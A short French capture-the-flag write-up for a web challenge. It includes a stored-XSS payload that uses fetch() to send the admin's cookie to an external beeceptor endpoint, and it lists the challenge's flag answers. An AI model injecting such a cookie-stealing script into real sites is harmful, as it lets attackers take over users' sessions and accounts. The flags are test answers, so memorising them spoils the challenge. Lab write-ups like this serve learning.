# FLAG 1:
## Observations:
- Admin ajoute un nouveau post périodiquement
- cookie contient username/password

J'ai commencé par me créer un user. Mon premier instinct a été de tester si du XSS marche, avec un simple `<script>alert(0)</script>`. Une fois que j'ai confirmé ça, j'ai créer un petit payload qui vole le cookie de l'admin et l'envoie à un beeceptor. 

Payload: `<script>fetch("https://testekasdk.free.beeceptor.com/?flag=" + document.cookie)</script>`
Flag: FLAGCOOKIESAREDELICIOUS

# FLAG 2:
## Observations:
- En tant que user normal, on ne voit pas le post #3

En me connectant en tant qu'admin, je vois le post #3 qui contient le flag.

Flag: FlagOhOHOOhSNEAKY

# FLAG 3:

En cherchant dans le HTML pour le mot "flag" on trouve le flag.

Flag:  FLAGImAbleToSearchAnHTMLPage 